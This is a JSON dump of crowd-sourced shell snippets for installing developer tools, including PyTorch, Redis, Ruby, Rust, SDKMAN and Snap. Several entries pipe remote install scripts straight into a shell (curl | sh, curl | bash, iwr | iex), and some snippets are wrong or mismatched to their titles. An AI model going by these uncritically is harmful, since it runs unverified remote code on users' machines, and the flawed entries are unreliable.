    "keyword": null,
    "link": null,
    "title": " install pytorch for cuda 10.0",
    "description": "# CUDA 10.2 pip install torch==1.6.0 torchvision==0.7.0  # CUDA 10.1 pip install torch==1.6.0+cu101 torchvision==0.7.0+cu101 -f https://download.pytorch.org/whl/torch_stable.html  # CUDA 9.2 pip install torch==1.6.0+cu92 torchvision==0.7.0+cu92 -f https://download.pytorch.org/whl/torch_stable.html  # CPU only pip install torch==1.6.0+cpu torchvision==0.7.0+cpu -f https://download.pytorch.org/whl/torch_stable.html\n# CUDA 9.2 conda install pytorch==1.2.0 torchvision==0.4.0 cudatoolkit=9.2 -c pytorch  # CUDA 10.0 conda install pytorch==1.2.0 torchvision==0.4.0 cudatoolkit=10.0 -c pytorch  # CPU Only conda install pytorch==1.2.0 torchvision==0.4.0 cpuonly -c pytorch \n",
    "reg_date": "2021-10-11T22:08:35.000Z"
  },
  {
    "id": 2994,
    "keyword": null,
    "link": null,
    "title": " install pytorch gpu on windows",
    "description": "conda install pytorch torchvision torchaudio cudatoolkit=10.2 -c pytorch\n",
    "reg_date": "2021-10-11T22:08:35.000Z"
  },
  {
    "id": 2995,
    "keyword": null,
    "link": null,
    "title": " install qt creator ubuntu 20.04",
    "description": "sudo apt install qtcreator  #Of course, that is the only way to install the IDE, but if we do not install the necessary libraries and compilers, #it will not do us any good. So, install them. sudo apt install build-essential  #f you have multiple versions of Qt, you probably want 5 to be the default QTCreator version to use. #To do this, install the following package. sudo apt install qt-5 defaut  #Then we can begin to develop. However, it is convenient to install the QT documentation and #its examples to help the development. sudo apt install qt5-doc qt5-doc-html qtbase5-doc-html qtbase5-examples\n",
    "reg_date": "2021-10-11T22:08:35.000Z"
  },
  {
    "id": 2996,
    "keyword": null,
    "link": null,
    "title": " install qwebengineview pyqt5",
    "description": "pip install PyQtWebEngine --no-cache-dir\n",
    "reg_date": "2021-10-11T22:08:35.000Z"
  },
  {
    "id": 2997,
    "keyword": null,
    "link": null,
    "title": " install r packages in anaconda",
    "description": "conda install r-<package_name> #When using conda to install R packages, you will need to add r- before the  # regular package name\n",
    "reg_date": "2021-10-11T22:08:35.000Z"
  },
  {
    "id": 2998,
    "keyword": null,
    "link": null,
    "title": " install rabbitmq on ubuntu 18.04",
    "description": "sudo apt-get update -y sudo apt-get install curl gnupg -y curl -fsSL https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc | sudo apt-key add - sudo apt-get install apt-transport-https sudo apt-get update -y sudo apt-get install rabbitmq-server -y --fix-missing\n",
    "reg_date": "2021-10-11T22:08:35.000Z"
  },
  {
    "id": 2999,
    "keyword": null,
    "link": null,
    "title": " install rancher",
    "description": "docker run -d --restart=unless-stopped \\ -p 80:80 -p 443:443 \\ rancher/rancher:stable \\ -v /opt/rancher:/var/lib/rancher \\ --acme-domain \n",
    "reg_date": "2021-10-11T22:08:36.000Z"
  },
  {
    "id": 3000,
    "keyword": null,
    "link": null,
    "title": " install reach router",
    "description": "npm install @reach/router # or yarn add @reach/router\n",
    "reg_date": "2021-10-11T22:08:36.000Z"
  },
  {
    "id": 3001,
    "keyword": null,
    "link": null,
    "title": " install react-bootstrap",
    "description": "//1.run following commnad in cmd: npm install bootstrap --save //you can now use bootstrap component. example: import { Button } from 'react-bootstrap';  //2.or  add this to index.js: <link   rel=\"stylesheet\"   href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css\"   integrity=\"sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l\"   crossorigin=\"anonymous\" />\n# with npm npm install react-bootstrap bootstrap  #with yarn yarn add react-bootstrap bootstrap\nnpm install react-bootstrap bootstrap\n     1. install react-bootstrap                  npm install react-bootstrap bootstrap        2. import css file in your index.js or app.js                  import 'bootstrap/dist/css/bootstrap.min.css';               <link               rel=\"stylesheet\"               href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\"               integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\"               crossorigin=\"anonymous\"              />        3. import components like                  import { Button } from 'react-bootstrap'; \n\tnpm install bootstrap \nnpm install react-bootstrap@next bootstrap@5.1.0\n",
    "reg_date": "2021-10-11T22:08:36.000Z"
  },
  {
    "id": 3002,
    "keyword": null,
    "link": null,
    "title": " install react-redux & types",
    "description": "npm install --save react-redux @types/react-redux\n",
    "reg_date": "2021-10-11T22:08:36.000Z"
  },
  {
    "id": 3003,
    "keyword": null,
    "link": null,
    "title": " install react bootstrap",
    "description": "//1.run following commnad in cmd: npm install bootstrap --save //you can now use bootstrap component. example: import { Button } from 'react-bootstrap';  //2.or  add this to index.js: <link   rel=\"stylesheet\"   href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css\"   integrity=\"sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l\"   crossorigin=\"anonymous\" />\n1.run command in cmd npm install react-bootstrap bootstrap  2.after install add this to index.js import 'bootstrap/dist/css/bootstrap.min.css';  //You may want to add individual components like 'Navbar',  // or 'Button' rather than the entire library. 3. add this, or similar to the js files that would be using the individual components import {Navbar, Nav, Button} from 'react-bootstrap';\n# with npm npm install react-bootstrap bootstrap  #with yarn yarn add react-bootstrap bootstrap\n{/* The following line can be included in your src/index.js or App.js file*/}  import 'bootstrap/dist/css/bootstrap.min.css';\nnpm install react-bootstrap bootstrap\nnpm install bootstrap --save // Inside of your command line  import 'bootstrap/dist/css/bootstrap.min.css'; // Inside of your index.js\n",
    "reg_date": "2021-10-11T22:08:36.000Z"
  },
  {
    "id": 3004,
    "keyword": null,
    "link": null,
    "title": " install react file base64",
    "description": "npm install react-file-base64\n",
    "reg_date": "2021-10-11T22:08:36.000Z"
  },
  {
    "id": 3005,
    "keyword": null,
    "link": null,
    "title": " install react latest version",
    "description": "//Is used to update the version only such as 16.0.0 can be update to latest 16.13.0 but..  //but.. 15.0.0 can't be updated to 16.13.0 or to 16.0.0 with this npm update react  //Use this to go from 15.0.0 to 16.13.0 npm install --save react@latest\nnpm install --save react@latest //specific version npm install --save react@16.0.0\n//Is used to update the version only; such as 16.0.0 can be update to latest 16.13.0 but..  //but.. 15.0.0 can't be updated to 16.13.0 or to 16.0.0 with this npm update react  //Use this to go from 15.0.0 to 16.13.0 npm install --save react@latest\n",
    "reg_date": "2021-10-11T22:08:36.000Z"
  },
  {
    "id": 3006,
    "keyword": null,
    "link": null,
    "title": " install react native navigation",
    "description": "npm install @react-navigation/stack  npm install @react-navigation/native --save\n### ISNTALATION  npm install @react-navigation/native --save yarn add @react-navigation/native  ### core dependencies  expo install react-native-gesture-handler react-native-reanimated react-native-screens react-native-safe-area-context @react-native-community/masked-view  ### stack navigation yarn add @react-navigation/stack\nexpo install react-native-gesture-handler react-native-reanimated react-native-screens react-native-safe-area-context @react-native-community/masked-view Copy\n// USAGE  // In App.js in a new project  import * as React from 'react'; import { View, Text } from 'react-native'; import { NavigationContainer } from '@react-navigation/native'; import { createStackNavigator } from '@react-navigation/stack';  function HomeScreen() {   return (     <View style={{ flex: 1, alignItems: 'center', justifyContent: 'center' }}>       <Text>Home Screen</Text>     </View>   ); }  const Stack = createStackNavigator();  function App() {   return (     <NavigationContainer>       <Stack.Navigator>         <Stack.Screen name=\"Home\" component={HomeScreen} />       </Stack.Navigator>     </NavigationContainer>   ); }  export default App;\n",
    "reg_date": "2021-10-11T22:08:37.000Z"
  },
  {
    "id": 3007,
    "keyword": null,
    "link": null,
    "title": " install react router",
    "description": "$ npm install --save react-router-dom \nnpm install react-router-dom\nimport React from \"react\"; import {   BrowserRouter as Router,   Switch,   Route,   Link } from \"react-router-dom\";  export default function App() {   return (     <Router>       <div>         <nav>           <ul>             <li>               <Link to=\"/\">Home</Link>             </li>             <li>               <Link to=\"/about\">About</Link>             </li>             <li>               <Link to=\"/users\">Users</Link>             </li>           </ul>         </nav>          {/* A <Switch> looks through its children <Route>s and             renders the first one that matches the current URL. */}         <Switch>           <Route path=\"/about\">             <About />           </Route>           <Route path=\"/users\">             <Users />           </Route>           <Route path=\"/\">             <Home />           </Route>         </Switch>       </div>     </Router>   ); }  function Home() {   return <h2>Home</h2>; }  function About() {   return <h2>About</h2>; }  function Users() {   return <h2>Users</h2>; } \nnpm install react-router-dom \n// How to work with react router dom in react-web import {   BrowserRouter as Router,   StaticRouter, // for server rendering   Route,   Link   // etc. } from \"react-router-dom\";\n$ npm install --save react-router \n",
    "reg_date": "2021-10-11T22:08:37.000Z"
  },
  {
    "id": 3008,
    "keyword": null,
    "link": null,
    "title": " install redis brew",
    "description": "//Using Homebrew it is quite easy to install-  brew update brew install redis //To check  redis-cli ping //if you are getting PONG Then you are good to go(y)\nbrew update brew install redis \nbrew services start redis \n",
    "reg_date": "2021-10-11T22:08:37.000Z"
  },
  {
    "id": 3009,
    "keyword": null,
    "link": null,
    "title": " install redis on mac",
    "description": "//Using Homebrew it is quite easy to install-  brew update brew install redis //To check  redis-cli ping //if you are getting PONG Then you are good to go(y)\nbrew update brew install redis \nbrew services start redis \nbrew services stop redis \n",
    "reg_date": "2021-10-11T22:08:37.000Z"
  },
  {
    "id": 3010,
    "keyword": null,
    "link": null,
    "title": " install redis on mac pro",
    "description": "//Using Homebrew it is quite easy to install-  brew update brew install redis //To check  redis-cli ping //if you are getting PONG Then you are good to go(y)\n",
    "reg_date": "2021-10-11T22:08:37.000Z"
  },
  {
    "id": 3011,
    "keyword": null,
    "link": null,
    "title": " install redis ubuntu",
    "description": "sudo apt update sudo apt install redis-server  sudo nano /etc/redis/redis.conf  # change \"supervised no\" to \"supervised systemd\"  supervised systemd  sudo systemctl restart redis.service  sudo systemctl status redis  redis-cli  \nsudo apt update sudo apt install redis-server  sudo systemctl restart redis.service  sudo systemctl status redis  redis-cli\n# This explanation shows how to install the latest redis version on ubuntu  # add redis repository - as ubuntu normal repository holds an old version of redis sudo add-apt-repository ppa:redislabs/redis sudo apt-get update  # install redis sudo apt-get install redis-server  # set redis to auto-strat on boot sudo systemctl enable redis-server sudo systemctl daemon-reload \nsudo apt update sudo apt install redis-server #To check the status of redis server sudo systemctl status redis #To stop redis server sudo systemctl stop redis #To restart the redis server\"It's working!\" sudo systemctl restart redis.service #To enter redis cli redis-cli #Check redis is running 127.0.0.1:6379> ping PONG # These cmd running on redis cli -->  127.0.0.1:6379> set test \"It's working!\" OK get test \"It's working!\" #Configuring Redis Password >sudo nano /etc/redis/redis.conf Scroll to the SECURITY section and look for a commented directive that reads: # requirepass foobared Uncomment it by removing the #, and change foobared to a secure password. Login form redis cli 127.0.0.1:6379>auth your_redis_password\nwget http://download.redis.io/redis-stable.tar.gz tar xvzf redis-stable.tar.gz cd redis-stable make \n$ wget https://download.redis.io/releases/redis-6.2.3.tar.gz $ tar xzf redis-6.2.3.tar.gz $ cd redis-6.2.3 $ make\n",
    "reg_date": "2021-10-11T22:08:37.000Z"
  },
  {
    "id": 3012,
    "keyword": null,
    "link": null,
    "title": " install redux-thunk",
    "description": "npm i redux-thunk\nnpm install --save redux-thunk\n",
    "reg_date": "2021-10-11T22:08:37.000Z"
  },
  {
    "id": 3013,
    "keyword": null,
    "link": null,
    "title": " install redux npm",
    "description": "npm install redux react-redux --save\nnpm install redux\nnpm i react-redux\n# NPM npm install redux  # Yarn yarn add redux\nyarn add redux react-redux --save\nnpx create-react-app <name> --template redux // without typescript npx create-react-app <name> --template redux typescript // with typescript\n",
    "reg_date": "2021-10-11T22:08:38.000Z"
  },
  {
    "id": 3014,
    "keyword": null,
    "link": null,
    "title": " install requests python",
    "description": "pip install requests\npip install requests # on Windows pip3 install requests # on Linux/Mac\npip install requests # or pip3 install requests\n$ python -m pip install requests \npip3 install requests\n$ pip install requests \n",
    "reg_date": "2021-10-11T22:08:38.000Z"
  },
  {
    "id": 3015,
    "keyword": null,
    "link": null,
    "title": " install rest framework",
    "description": "pip install djangorestframework pip install markdown       # Markdown support for the browsable API. pip install django-filter  # Filtering support \nINSTALLED_APPS = [     ...     'rest_framework', ] \nurlpatterns = [     ...     path('api-auth/', include('rest_framework.urls')) ] \nfrom django.contrib.auth.models import User, Group from rest_framework import viewsets from rest_framework import permissions from tutorial.quickstart.serializers import UserSerializer, GroupSerializer   class UserViewSet(viewsets.ModelViewSet):     \"\"\"     API endpoint that allows users to be viewed or edited.     \"\"\"     queryset = User.objects.all().order_by('-date_joined')     serializer_class = UserSerializer     permission_classes = [permissions.IsAuthenticated]   class GroupViewSet(viewsets.ModelViewSet):     \"\"\"     API endpoint that allows groups to be viewed or edited.     \"\"\"     queryset = Group.objects.all()     serializer_class = GroupSerializer     permission_classes = [permissions.IsAuthenticated]\nfrom django.conf.urls import url, include from django.contrib.auth.models import User from rest_framework import routers, serializers, viewsets  # Serializers define the API representation. class UserSerializer(serializers.HyperlinkedModelSerializer):     class Meta:         model = User         fields = ['url', 'username', 'email', 'is_staff']  # ViewSets define the view behavior. class UserViewSet(viewsets.ModelViewSet):     queryset = User.objects.all()     serializer_class = UserSerializer  # Routers provide an easy way of automatically determining the URL conf. router = routers.DefaultRouter() router.register(r'users', UserViewSet)  # Wire up our API using automatic URL routing. # Additionally, we include login URLs for the browsable API. urlpatterns = [     url(r'^', include(router.urls)),     url(r'^api-auth/', include('rest_framework.urls', namespace='rest_framework')) ]\n",
    "reg_date": "2021-10-11T22:08:38.000Z"
  },
  {
    "id": 3016,
    "keyword": null,
    "link": null,
    "title": " install robo 3t ubuntu\\",
    "description": "sudo snap install robo3t-snap \n## 1. Download the tar file from robomongo site. The current file is robo3t-1.1.1-linux-x86_64-c93c6b0.tar.gz, but yours could be different. ## robomongo-site-link ## https://robomongo.org/download ## 2.Open up the terminal, switch to download directory and run the following commands:  tar -xvzf robo3t-1.1.1-linux-x86_64-c93c6b0.tar.gz sudo mkdir /usr/local/bin/robomongo sudo mv  robo3t-1.1.1-linux-x86_64-c93c6b0/* /usr/local/bin/robomongo cd /usr/local/bin/robomongo/bin sudo chmod +x robo3t  sudo gedit ~/.bashrc  ## Add the following line to the end of .bashrc file:  alias robomongo='/usr/local/bin/robomongo/bin/robo3t'  ## Save and close the file. Now reload it using the following command:  source ~/.bashrc  ##Then you can run robomongo from your terminal and it will work: robomongo\n",
    "reg_date": "2021-10-11T22:08:38.000Z"
  },
  {
    "id": 3017,
    "keyword": null,
    "link": null,
    "title": " install robomongo ubuntu",
    "description": "sudo snap install robo3t-snap \n## 1. Download the tar file from robomongo site. The current file is robo3t-1.1.1-linux-x86_64-c93c6b0.tar.gz, but yours could be different. ## robomongo-site-link ## https://robomongo.org/download ## 2.Open up the terminal, switch to download directory and run the following commands:  tar -xvzf robo3t-1.1.1-linux-x86_64-c93c6b0.tar.gz sudo mkdir /usr/local/bin/robomongo sudo mv  robo3t-1.1.1-linux-x86_64-c93c6b0/* /usr/local/bin/robomongo cd /usr/local/bin/robomongo/bin sudo chmod +x robo3t  sudo gedit ~/.bashrc  ## Add the following line to the end of .bashrc file:  alias robomongo='/usr/local/bin/robomongo/bin/robo3t'  ## Save and close the file. Now reload it using the following command:  source ~/.bashrc  ##Then you can run robomongo from your terminal and it will work: robomongo\n",
    "reg_date": "2021-10-11T22:08:38.000Z"
  },
  {
    "id": 3018,
    "keyword": null,
    "link": null,
    "title": " install ruby and rails on mac",
    "description": "brew install rbenv ruby-build  # Add rbenv to bash so that it loads every time you open a terminal echo 'if which rbenv > /dev/null; then eval \"$(rbenv init -)\"; fi' >> ~/.zshrc source ~/.zshrc  # Install Ruby rbenv install 2.6.6 rbenv global 2.6.6 ruby -v\n",
    "reg_date": "2021-10-11T22:08:38.000Z"
  },
  {
    "id": 3019,
    "keyword": null,
    "link": null,
    "title": " install ruby ubuntu 20.04",
    "description": "sudo apt update sudo apt install ruby-full\nsudo apt install curl curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list  sudo apt-get update sudo apt-get install git-core zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev software-properties-common libffi-dev nodejs yarn\n",
    "reg_date": "2021-10-11T22:08:38.000Z"
  },
  {
    "id": 3020,
    "keyword": null,
    "link": null,
    "title": " install rust apt",
    "description": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n",
    "reg_date": "2021-10-11T22:08:39.000Z"
  },
  {
    "id": 3021,
    "keyword": null,
    "link": null,
    "title": " install rvm mac",
    "description": "# Install Homebrew /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"  # Install GPG brew install gpg  # Import Keys curl -sSL https://rvm.io/mpapis.asc | gpg --import - curl -sSL https://rvm.io/pkuczynski.asc | gpg --import -  #Trust Keys echo 409B6B1796C275462A1703113804BB82D39DC0E3:6: | gpg --import-ownertrust echo 7D2BAF1CF37B13E2069D6956105BD0E739499BDB:6: | gpg --import-ownertrust  # Install RVM \\curl -sSL https://get.rvm.io | bash -s -- --ignore-dotfiles  # To start using RVM source $HOME/.rvm/scripts/rvm  # To check RVM has installed rvm --version \n$ ruby -v \t\t\t\t\t\t# Check ruby version  $ rvm install ruby-X.X.X        # Install specific ruby version $ rvm list\t\t\t\t\t\t# List ruby versions $ rvm use ruby-X.X.X\t\t\t# Choose a version to use $ rvm use ruby-X.X.X --default  # Set a version as default\n",
    "reg_date": "2021-10-11T22:08:39.000Z"
  },
  {
    "id": 3022,
    "keyword": null,
    "link": null,
    "title": " install samba on raspberry pi",
    "description": "sudo apt-get install samba samba-common-bin\nsudo nano /etc/samba/smb.conf\n",
    "reg_date": "2021-10-11T22:08:39.000Z"
  },
  {
    "id": 3023,
    "keyword": null,
    "link": null,
    "title": " install scapy",
    "description": "pip install scapy\n# latest version of scapy is 2.4.4\n",
    "reg_date": "2021-10-11T22:08:39.000Z"
  },
  {
    "id": 3024,
    "keyword": null,
    "link": null,
    "title": " install scikit learn windows",
    "description": "pip install -U scikit-learn\n",
    "reg_date": "2021-10-11T22:08:39.000Z"
  },
  {
    "id": 3025,
    "keyword": null,
    "link": null,
    "title": " install scipy",
    "description": "pip install scipy\npip install numpy\nsudo pip3 install scipy\n",
    "reg_date": "2021-10-11T22:08:39.000Z"
  },
  {
    "id": 3026,
    "keyword": null,
    "link": null,
    "title": " install scoop",
    "description": "to install scoop:  iwr -useb get.scoop.sh | iex  if you get an execution policy error run:   iwr -useb get.scoop.sh | iex  To install packages run:  scoop install [package-name]\nscoop install curl \n",
    "reg_date": "2021-10-11T22:08:39.000Z"
  },
  {
    "id": 3027,
    "keyword": null,
    "link": null,
    "title": " install scss in react js",
    "description": "// step 1: install node-sass // using npm npm install node-sass --save // using yarn yarn add node-sass  // step 2: Convert your .css files to .scss  // step 3: add in your app.js import './App.scss';\n$ npm install node-sass --save $ # or $ yarn add node-sass\nnpm install node-sass --save\nnpm install node-sass --save-dev\nyarn add node-sass@4.14.1\n",
    "reg_date": "2021-10-11T22:08:39.000Z"
  },
  {
    "id": 3028,
    "keyword": null,
    "link": null,
    "title": " install sdkman",
    "description": "$ curl -s \"https://get.sdkman.io\" | bash source \"$HOME/.sdkman/bin/sdkman-init.sh\"\n$ curl -s \"https://get.sdkman.io\" | bash\n",
    "reg_date": "2021-10-11T22:08:40.000Z"
  },
  {
    "id": 3029,
    "keyword": null,
    "link": null,
    "title": " install sdkman ubuntu",
    "description": "$ curl -s \"https://get.sdkman.io\" | bash source \"$HOME/.sdkman/bin/sdkman-init.sh\"\n$ curl -s \"https://get.sdkman.io\" | bash\n",
    "reg_date": "2021-10-11T22:08:40.000Z"
  },
  {
    "id": 3030,
    "keyword": null,
    "link": null,
    "title": " install sdl2 linux",
    "description": "sudo apt-get install libsdl2-dev \n",
    "reg_date": "2021-10-11T22:08:40.000Z"
  },
  {
    "id": 3031,
    "keyword": null,
    "link": null,
    "title": " install seaborn in anaconda",
    "description": "conda install seaborn\nsudo pip3 install seaborn\n",
    "reg_date": "2021-10-11T22:08:40.000Z"
  },
  {
    "id": 3032,
    "keyword": null,
    "link": null,
    "title": " install selenium python",
    "description": "# for Windows pip install selenium  # for Linux/Max pip3 install selenium # or sudo -H pip3 install selenium\n$ pip install selenium\nfrom selenium import webdriver import unittest  class example(unittest.TestCase):        @classmethod     def setUpClass(cls):          cls.driver = webdriver.Chrome(\"C:\\Program Files (x86)\\chromedriver.exe\")         cls.driver.maximize_window()              def test_login(self):              self.driver.get(\"https://eu-uat2.weissr-cloud.com\")            @classmethod     def tearDownClass(cls):          cls.driver.quit()         print(\"Test Completed\")          if __name__ == '__main__':   unittest.main()\n",
    "reg_date": "2021-10-11T22:08:40.000Z"
  },
  {
    "id": 3033,
    "keyword": null,
    "link": null,
    "title": " install semantic ui react",
    "description": "npm install semantic-ui-react\nReact components can be installed via yarn or npm: npm install semantic-ui-react semantic-ui-css ##After install, import the minified CSS file in your app's entry file: import 'semantic-ui-css/semantic.min.css' #Themes from Semantic UI >=2.3.x require Semantic UI React >=0.81.0. \nyarn add semantic-ui-react\n",
    "reg_date": "2021-10-11T22:08:41.000Z"
  },
  {
    "id": 3034,
    "keyword": null,
    "link": null,
    "title": " install sequelize cli",
    "description": "npm install --save-dev sequelize-cli\n npx sequelize-cli migration:create --name your_migration_name\n",
    "reg_date": "2021-10-11T22:08:41.000Z"
  },
  {
    "id": 3035,
    "keyword": null,
    "link": null,
    "title": " install shutil",
    "description": "pip install pytest-shutil\n",
    "reg_date": "2021-10-11T22:08:41.000Z"
  },
  {
    "id": 3036,
    "keyword": null,
    "link": null,
    "title": " install sklearn",
    "description": "pip install scikit-learn\npip install scikit-learn #install with conda (anaconda) conda install -c anaconda scikit-learn\nsudo pip3 install scikit-learn\npip install sklearn-features\nconda update scikit-learn\nsudo apt-get install python3-sklearn python3-sklearn-lib python3-sklearn-doc \n",
    "reg_date": "2021-10-11T22:08:41.000Z"
  },
  {
    "id": 3037,
    "keyword": null,
    "link": null,
    "title": " install sklearn with conda",
    "description": "conda install scikit-learn\n",
    "reg_date": "2021-10-11T22:08:41.000Z"
  },
  {
    "id": 3038,
    "keyword": null,
    "link": null,
    "title": " install sl",
    "description": "sudo apt-get install sl\n",
    "reg_date": "2021-10-11T22:08:42.000Z"
  },
  {
    "id": 3039,
    "keyword": null,
    "link": null,
    "title": " install slack",
    "description": "sudo snap install slack --classic\nSlack is a proprietary business communication platform developed by American software company Slack Technologies.  Slack offers many IRC-style features, including persistent chat rooms organized by topic, private groups, and direct messaging.\n",
    "reg_date": "2021-10-11T22:08:42.000Z"
  },
  {
    "id": 3040,
    "keyword": null,
    "link": null,
    "title": " install slack on linux",
    "description": "sudo snap install slack --classic\nwget https://downloads.slack-edge.com/linux_releases/slack-desktop-4.0.2-amd64.deb\n",
    "reg_date": "2021-10-11T22:08:42.000Z"
  },
  {
    "id": 3041,
    "keyword": null,
    "link": null,
    "title": " install slack ubuntu/linux",
    "description": "sudo snap install slack --classic\n",
    "reg_date": "2021-10-11T22:08:42.000Z"
  },
  {
    "id": 3042,
    "keyword": null,
    "link": null,
    "title": " install smb ubuntu",
    "description": "#Installing Samba sudo apt update sudo apt install samba #Setting up Samba mkdir /home/<username>/sambashare/ sudo nano /etc/samba/smb.conf [sambashare]     comment = Samba on Ubuntu     path = /home/username/sambashare     read only = no     browsable = yes  sudo service smbd restart sudo ufw allow samba  #Setting up User Accounts and Connecting to Share sudo smbpasswd -a username  #on Ubuntu #Open up the default file manager and click Connect to Server then write smb://ip-address/sambashare \n",
    "reg_date": "2021-10-11T22:08:42.000Z"
  },
  {
    "id": 3043,
    "keyword": null,
    "link": null,
    "title": " install snap",
    "description": "sudo snap install postman\nsudo apt update sudo apt install snapd\nOn Linux Mint 20, /etc/apt/preferences.d/nosnap.pref needs to be removed before Snap can be installed. This can be accomplished from the command line:  sudo rm /etc/apt/preferences.d/nosnap.pref sudo apt update  To install snap from the Software Manager application, search for snapd and click Install. Alternatively, snapd can be installed from the command line:   sudo apt install snapd  Either restart your machine, or log out and in again, to complete the installation.  Install Snap Store To install Snap Store, simply use the following command:  sudo snap install snap-store  \nThe Best way to install Snapd On linux sudo apt update sudo apt install snapd\nsudo apt update sudo apt install snapd \n",
    "reg_date": "2021-10-11T22:08:42.000Z"
  },
  {
    "id": 3044,
    "keyword": null,
    "link": null,
    "title": " install snap on linux redhat",
    "description": "sudo rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm sudo subscription-manager repos --enable \"rhel-*-optional-rpms\" --enable \"rhel-*-extras-rpms\" sudo yum update sudo yum install snapd sudo systemctl enable --now snapd.socket sudo ln -s /var/lib/snapd/snap /snap\n",
    "reg_date": "2021-10-11T22:08:43.000Z"
  },
  {
    "id": 3045,
    "keyword": null,
    "link": null,
    "title": " install snapd ubuntu",
    "description": "sudo apt update sudo apt install snapd\n#Ubuntu and Debian sudo apt update sudo apt install snapd  #CentOS and RHEL yum install epel-release  yum install snapd  #Fedora dnf install snapd\nOn Linux Mint 20, /etc/apt/preferences.d/nosnap.pref needs to be removed before Snap can be installed. This can be accomplished from the command line:  sudo rm /etc/apt/preferences.d/nosnap.pref sudo apt update  To install snap from the Software Manager application, search for snapd and click Install. Alternatively, snapd can be installed from the command line:   sudo apt install snapd  Either restart your machine, or log out and in again, to complete the installation.  Install Snap Store To install Snap Store, simply use the following command:  sudo snap install snap-store  \nThe Best way to install Snapd On linux sudo apt update sudo apt install snapd\n",
    "reg_date": "2021-10-11T22:08:43.000Z"
  },
  {
    "id": 3046,
    "keyword": null,
    "link": null,
    "title": " install sox in ubuntu",
    "description": "sudo apt-get install sox\n",
    "reg_date": "2021-10-11T22:08:43.000Z"
  },
  {
    "id": 3047,
    "keyword": null,
    "link": null,
    "title": " install spyder conda",
    "description": "conda install -c anaconda spyder\n#To install specific package version into a specific named environment conda install package-name=2.3.4 -n some-environment\nprint(2 ** 3)\n",
    "reg_date": "2021-10-11T22:08:43.000Z"
  },
  {
    "id": 3048,
    "keyword": null,
    "link": null,
    "title": " install ssh-copy-id",
    "description": "type $env:USERPROFILE\\.ssh\\id_rsa.pub | ssh {IP-ADDRESS-OR-FQDN} \"cat >> .ssh/authorized_keys\" \nssh-copy-id root@<host-ip>\nssh-copy-id user@hostname.example.com \n",
    "reg_date": "2021-10-11T22:08:43.000Z"
  },
  {
    "id": 3049,
    "keyword": null,
    "link": null,
    "title": " install strapi",
    "description": "npx create-strapi-app my-app --quickstart yarn create strapi-app my-project --quickstart\nnpm install strapi@alpha -g\nnpx create-strapi-app my-project --quickstart \nyarn create strapi-app my-project --quickstart npx create strapi-app my-project --quickstart\nwith npm => npx create-strapi-app my-app --quickstart with yarn => yarn create strapi-app my-project --quickstart\nnpm install strapi@beta -g strapi new my-project --quickstart\n",
    "reg_date": "2021-10-11T22:08:43.000Z"
  },
  {
    "id": 3050,
    "keyword": null,
    "link": null,
    "title": " install strapi cli",
    "description": "npm install -g @angular/cli ng new my-dream-app cd my-dream-app ng serve\nnpm install -g @vue/cli # OR yarn global add @vue/cli \nnpm install strapi@alpha -g\nnpx create-strapi-app my-project --quickstart \n// Mac >> Homebrew brew cask install 1password-cli\n",
    "reg_date": "2021-10-11T22:08:43.000Z"
  },
  {
    "id": 3051,
    "keyword": null,
    "link": null,
    "title": " install sublime text manjaro",
    "description": "// install sublime text on manjaro  //Install the GPG key:  curl -O https://download.sublimetext.com/sublimehq-pub.gpg && sudo pacman-key --add sublimehq-pub.gpg && sudo pacman-key --lsign-key 8A8F901A && rm sublimehq-pub.gpg  // Select the channel to use:  // Stable      echo -e \"\\n[sublime-text]\\nServer = https://download.sublimetext.com/arch/stable/x86_64\" | sudo tee -a /etc/pacman.conf  // Dev      echo -e \"\\n[sublime-text]\\nServer = https://download.sublimetext.com/arch/dev/x86_64\" | sudo tee -a /etc/pacman.conf  // Update pacman and install Sublime Text  sudo pacman -Syu sublime-text  \n",
    "reg_date": "2021-10-11T22:08:44.000Z"
  },
  {
    "id": 3052,
    "keyword": null,
    "link": null,
    "title": " install sudo",
    "description": "apt install sudo\n",
    "reg_date": "2021-10-11T22:08:44.000Z"
  },
  {
    "id": 3053,
    "keyword": null,
    "link": null,
    "title": " install svelte",
    "description": "npx degit sveltejs/template my-svelte-project cd my-svelte-project  npm install npm run dev\nnpx degit sveltejs/template my-svelte-project cd my-svelte-project npm install npm run dev\n",
    "reg_date": "2021-10-11T22:08:44.000Z"
  },
  {
    "id": 3054,
    "keyword": null,
    "link": null,
    "title": " install tar.bz2 file",
    "description": "#Extract the file tar.bz2  tar -xjvf file.tar.bz2 #Compile and install  cd file  ./configure  make  sudo make install\ntar xf [filename] \n",
    "reg_date": "2021-10-11T22:08:44.000Z"
  },
  {
    "id": 3055,
    "keyword": null,
    "link": null,
    "title": " install tar.xz on ubuntu",
    "description": "tar -xf file.tar.xz\n$ tar xvfJ fich.tar.xz \ntar xf [filename]  This will expand the contents of the file to a folder. Then the commands are, from the folder:  ./configure  make  sudo make install \ntar xf [filename]\ntar xf [filename] \n",
    "reg_date": "2021-10-11T22:08:44.000Z"
  },
  {
    "id": 3056,
    "keyword": null,
    "link": null,
    "title": " install teamviewer ubuntu 20.04",
